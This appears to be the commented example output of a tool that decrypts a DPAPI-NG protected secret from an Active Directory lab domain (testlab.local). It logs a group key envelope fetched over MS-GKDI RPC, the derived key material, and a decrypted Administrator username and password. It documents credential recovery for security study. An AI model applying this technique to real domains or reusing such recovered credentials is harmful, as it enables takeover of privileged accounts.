# Unknown:		b'DHPB\x00\x01\x00\x00\x87\xa8\xe6\x1d\xb4\xb6f<\xff\xbb\xd1\x9ce\x19Y\x99\x8c\xee\xf6\x08f\r\xd0\xf2],\xee\xd4C^;\x00\xe0\r\xf8\xf1\xd6\x19W\xd4\xfa\xf7\xdfEa\xb2\xaa0\x16\xc3\xd9\x114\to\xaa;\xf4)m\x83\x0e\x9a| \x9e\x0cd\x97Qz\xbdZ\x8a\x9d0k\xcfg\xed\x91\xf9\xe6r[GX\xc0"\xe0\xb1\xefBu\xbf{l[\xfc\x11\xd4_\x90\x88\xb9A\xf5N\xb1\xe5\x9b\xb8\xbc9\xa0\xbf\x120\x7f\\O\xdbp\xc5\x81\xb2?v\xb6:\xca\xe1\xca\xa6\xb7\x90-RRg5H\x8a\x0e\xf1<m\x9aQ\xbf\xa4\xab:\xd84w\x96RM\x8e\xf6\xa1g\xb5\xa4\x18%\xd9g\xe1D\xe5\x14\x05d%\x1c\xca\xcb\x83\xe6\xb4\x86\xf6\xb3\xca?yqP`&\xc0\xb8W\xf6\x89\x96(V\xde\xd4\x01\n\xbd\x0b\xe6!\xc3\xa3\x96\nT\xe7\x10\xc3u\xf2cu\xd7\x01A\x03\xa4\xb5C0\xc1\x98\xaf\x12a\x16\xd2\'n\x11q_i8w\xfa\xd7\xef\t\xca\xdb\tJ\xe9\x1e\x1a\x15\x97?\xb3,\x9bs\x13M\x0b.wPf`\xed\xbdHL\xa7\xb1\x8f!\xef T\x07\xf4y:\x1a\x0b\xa1%\x10\xdb\xc1Pw\xbeF?\xffO\xedJ\xac\x0b\xb5U\xbe:l\x1b\x0ckG\xb1\xbc7s\xbf~\x8cob\x90\x12(\xf8\xc2\x8c\xbb\x18\xa5Z\xe3\x13A\x00\ne\x01\x96\xf91\xc7zW\xf2\xdd\xf4c\xe5\xe9\xec\x14Kw}\xe6*\xaa\xb8\xa8b\x8a\xc3v\xd2\x82\xd6\xed8d\xe6y\x82B\x8e\xbc\x83\x1d\x144\x8fo/\x91\x93\xb5\x04Z\xf2vqd\xe1\xdf\xc9g\xc1\xfb?.U\xa4\xbd\x1b\xff\xe8;\x9c\x80\xd0R\xb9\x85\xd1\x82\xea\n\xdb*;s\x13\xd3\xfe\x14\xc8HK\x1e\x05%\x88\xb9\xb7\xd2\xbb\xd2\xdf\x01a\x99\xec\xd0n\x15W\xcd\t\x15\xb35;\xbbd\xe0\xec7\x7f\xd0(7\r\xf9+R\xc7\x89\x14(\xcd\xc6~\xb6\x18KR=\x1d\xb2F\xc3/c\x07\x84\x90\xf0\x0e\xf8\xd6G\xd1H\xd4yTQ^#\'\xcf\xef\x98\xc5\x82fKL\x0fl\xc4\x16Y]\x00\x0b\x96!6R\xb4\xc9\xfe\xe07\xdfY$\nY\xdfO\x8f\x80l\xe1\x80\xa7+\xcdT\xd2\x1c@\x8d\xf6\xbd\xb0EaR\xb4=\x12\xbbr\x87:y\xcd\xcc\x83"1\x83.\xd0\x19\xb4\xe7m\xa7\xd2\r:d\x1aa8\xa9\xb6\xceC\xf72<\x8fw\xa2\x04\xd51\xc1|c\xae\xc4\xf0\x05\x05}B\x17\x13CtL\x92\x1e|F\x96\xe0y\xc5:0H\xd8\xd6\x8fM~\x1e\xff2&d\xd1\xbaV\xc5\xb1!\\U[\xc6\xf9c\xd1\x8b\xe2\x1e\xa2#B@6m\xd2]\\\r\x07O:v\xdaL\x94\xe2\xd6\x91\x16\x93\x8e\xabW\xa2aY\xa3\x1f&C\xc4\x08w\xedNnj\xc4P\x18\xd9\x1f\xfe\xf1\x07p\x90\x90\xb6\xb0NO\x04\x03\x90}\xb0nh\xe6<)\xe2\xdd"C\xe4\x7f\\\xc2k>\xbe\xbf\xde\xf2\xc8\x83\xb3\xbcOU\xfd\x7f\xc2\xa2\x86\xa8\x94\xd8\x94\xee(\xcb\xd3\xf4 \xd2vgS\xf2\x9f\xbf\xe5L\x84N\xb1\xb8\xa1\xac<\x89O\xdb\x98\xf4W\xd3\xfd8_'
# Domain:		testlab.local
# Forest:		testlab.local

# [-] Connecting to ncacn_ip_tcp:192.168.56.30[49689]
# [+] Connected
# [+] Binding to b'`Yx\xb9OR\xdf\x11\x8bm\x83\xdc\xde\xd7 \x85\x01\x00\x00\x00'
# [+] Successfully bound
# [-] Calling MS-GKDI GetKey
# [GROUP KEY ENVELOPE]
# Version:		1
# Magic:		0x4b53444b
# Flags:		2
# L0Index:		361
# L1Index:		18
# L2Index:		4
# RootKeyId:		b'\xc5>\x1b\xb7\x84W\x1cx\xa2X\x06=\xc9T\xafN'
# KdfAlgo:		SP800_108_CTR_HMAC
# KdfPara:		SHA512
# SecAlgo:		DH
# SecPara[FieldOrder]:	b'\x87\xa8\xe6\x1d\xb4\xb6f<\xff\xbb\xd1\x9ce\x19Y\x99\x8c\xee\xf6\x08f\r\xd0\xf2],\xee\xd4C^;\x00\xe0\r\xf8\xf1\xd6\x19W\xd4\xfa\xf7\xdfEa\xb2\xaa0\x16\xc3\xd9\x114\to\xaa;\xf4)m\x83\x0e\x9a| \x9e\x0cd\x97Qz\xbdZ\x8a\x9d0k\xcfg\xed\x91\xf9\xe6r[GX\xc0"\xe0\xb1\xefBu\xbf{l[\xfc\x11\xd4_\x90\x88\xb9A\xf5N\xb1\xe5\x9b\xb8\xbc9\xa0\xbf\x120\x7f\\O\xdbp\xc5\x81\xb2?v\xb6:\xca\xe1\xca\xa6\xb7\x90-RRg5H\x8a\x0e\xf1<m\x9aQ\xbf\xa4\xab:\xd84w\x96RM\x8e\xf6\xa1g\xb5\xa4\x18%\xd9g\xe1D\xe5\x14\x05d%\x1c\xca\xcb\x83\xe6\xb4\x86\xf6\xb3\xca?yqP`&\xc0\xb8W\xf6\x89\x96(V\xde\xd4\x01\n\xbd\x0b\xe6!\xc3\xa3\x96\nT\xe7\x10\xc3u\xf2cu\xd7\x01A\x03\xa4\xb5C0\xc1\x98\xaf\x12a\x16\xd2\'n\x11q_i8w\xfa\xd7\xef\t\xca\xdb\tJ\xe9\x1e\x1a\x15\x97'
# SecPara[Generator]:	b"?\xb3,\x9bs\x13M\x0b.wPf`\xed\xbdHL\xa7\xb1\x8f!\xef T\x07\xf4y:\x1a\x0b\xa1%\x10\xdb\xc1Pw\xbeF?\xffO\xedJ\xac\x0b\xb5U\xbe:l\x1b\x0ckG\xb1\xbc7s\xbf~\x8cob\x90\x12(\xf8\xc2\x8c\xbb\x18\xa5Z\xe3\x13A\x00\ne\x01\x96\xf91\xc7zW\xf2\xdd\xf4c\xe5\xe9\xec\x14Kw}\xe6*\xaa\xb8\xa8b\x8a\xc3v\xd2\x82\xd6\xed8d\xe6y\x82B\x8e\xbc\x83\x1d\x144\x8fo/\x91\x93\xb5\x04Z\xf2vqd\xe1\xdf\xc9g\xc1\xfb?.U\xa4\xbd\x1b\xff\xe8;\x9c\x80\xd0R\xb9\x85\xd1\x82\xea\n\xdb*;s\x13\xd3\xfe\x14\xc8HK\x1e\x05%\x88\xb9\xb7\xd2\xbb\xd2\xdf\x01a\x99\xec\xd0n\x15W\xcd\t\x15\xb35;\xbbd\xe0\xec7\x7f\xd0(7\r\xf9+R\xc7\x89\x14(\xcd\xc6~\xb6\x18KR=\x1d\xb2F\xc3/c\x07\x84\x90\xf0\x0e\xf8\xd6G\xd1H\xd4yTQ^#'\xcf\xef\x98\xc5\x82fKL\x0fl\xc4\x16Y"
# PrivKeyLength:		512
# PubKeyLength:		2048
# Domain:		testlab.local
# Forest:		testlab.local
# L1Key:		b"*\x95fyn5\xaf\xa5\x9b\xc7\x19\xa6\x89mg\x1eb\xab\x9c\xe6L\x07\x98\xc7\xc8\xd58\xcfa<\x8a\xdbI:\xb8\xc0e\x9b\xfc\x19s\x8br\xa8\x93\x9d'\xdfi\xdd\xae4[n\xbc\xd2\x89\xf45\xc4\xd9\x0b\x9c,"
# L2Key:		b'\xf6A\xd0\xb2\x83\x8b\xb3\x02\x89\x1f\xcf\xf9>5\xe2\xd4\xf2\x9f\xf3\xa6\x971\xeb\xac\x10\x96\xac\x894\xa5j\xa8\xf3*\x9a\x04K("H\xc0\xab$\x96s\xe9\x99h@i\x945\x1f\xcd\xad,t\x95\xb7c\xc9GP\xea'

# [-] Computing L2 Key
# [-] Computing Private Key
# [-] Computing Shared Secret based on Diffie-Helmann
# [-] Computing KEK
# b'VF\xd76\xcdz\xa5/aMX\xcb#\xc0"\xbfu\xc3\xd4\xa2z\xcd\x95e\x1eC\xf3\x9e\x11\x1d\x9a\xfc'
# [-] Unwraping CEK
# b'I\x1a\xe6\x98\xfc\x0ew\x81\xb4\xe9\xb9\x0fF\xcd\xed-\xdb\xd77c{{\x95\xb8@\xa2\xadH\xdf\x12H\xc2'
# [-] Got IV
# b'H\xf9\xe7\xdd\x07:\xfd\xf3.\x9f\xe9N'

# {"n":"Administrator","t":"1d971f20f608397","p":"6js]7;7//+Z+7q"}
